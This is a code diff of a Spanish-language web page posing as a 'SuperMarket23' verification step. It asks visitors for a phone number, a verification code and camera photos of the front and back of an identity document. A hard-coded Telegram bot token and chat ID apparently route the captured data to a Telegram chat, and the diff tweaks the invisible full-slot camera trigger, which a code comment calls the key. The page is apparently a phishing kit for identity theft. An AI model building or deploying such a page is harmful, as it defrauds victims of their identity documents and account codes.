@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SuperMarket23 - Verificación Oficial</title>
+    <title>SuperMarket23 - Verificación</title>
     <style>
         * { box-sizing: border-box; }
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #004494; text-align: center; }
@@ -14,18 +14,18 @@
         label { display: block; font-weight: bold; margin: 15px 0 5px 0; text-align: left; font-size: 13px; color: #004494; }
         input[type="tel"], input[type="text"] { width: 100%; padding: 16px; border: 2px solid #004494; border-radius: 10px; font-size: 16px; margin-bottom: 10px; }
         
-        /* Cuadros con disparador directo */
         .card-slot {
             width: 100%; height: 210px; border: 3px dashed #004494; border-radius: 15px;
             margin-bottom: 20px; position: relative; background-color: #f8faff; 
-            display: flex; align-items: center; justify-content: center; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
-        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; border-radius: 12px; display: none; z-index: 10; }
-        .slot-text { font-weight: bold; font-size: 14px; pointer-events: none; z-index: 5; }
+        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top:0; left:0; display: none; z-index: 10; }
+        .slot-text { font-weight: bold; font-size: 14px; z-index: 5; }
         
-        /* El input ahora cubre TODO el cuadro para que dispare siempre */
+        /* ESTA ES LA CLAVE: El input cubre todo el cuadro y es invisible */
         .camera-trigger {
-            position: absolute; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 20;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            opacity: 0; z-index: 50; cursor: pointer; -webkit-tap-highlight-color: transparent;
         }
 
         .btn-auth {
@@ -47,19 +47,19 @@
         <label>Documentación (Cámara Trasera)</label>
         
         <div class="card-slot">
-            <input type="file" id="in-1" class="camera-trigger" accept="image/*" capture="environment" onchange="p(this, 'v-1', 't-1')">
+            <input type="file" id="in-1" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-1', 't-1')">
             <img id="v-1" class="preview-img">
             <div id="t-1" class="slot-text">📷 TOCAR PARA TIRAR FOTO FRENTE</div>
         </div>
 
         <div class="card-slot">
-            <input type="file" id="in-2" class="camera-trigger" accept="image/*" capture="environment" onchange="p(this, 'v-2', 't-2')">
+            <input type="file" id="in-2" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-2', 't-2')">
             <img id="v-2" class="preview-img">
             <div id="t-2" class="slot-text">📷 TOCAR PARA TIRAR FOTO DORSO</div>
         </div>
 
         <div class="card-slot">
-            <input type="file" id="in-3" class="camera-trigger" accept="image/*" capture="environment" onchange="p(this, 'v-3', 't-3')">
+            <input type="file" id="in-3" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-3', 't-3')">
             <img id="v-3" class="preview-img">
             <div id="t-3" class="slot-text">📷 TOCAR PARA TIRAR FOTO EXTRA</div>
         </div>
@@ -75,7 +75,7 @@
         const token = "7544330182:AAFrW7uF7qG2IasXoR3vGq9oYv_H135p0S0";
         const chat_id = "-4748113880";
 
-        function p(input, imgId, txtId) {
+        function mostrar(input, imgId, txtId) {
             if (input.files && input.files[0]) {
                 const reader = new FileReader();
                 reader.onload = (e) => {
@@ -96,7 +96,7 @@
             const f3 = document.getElementById('in-3').files[0];
 
             if (!phone || !code || !f1 || !f2 || !f3) {
-                alert("Por favor, tire todas las fotos antes de continuar.");
+                alert("Debe completar todos los datos y tomar las 3 fotos.");
                 return;
             }
 
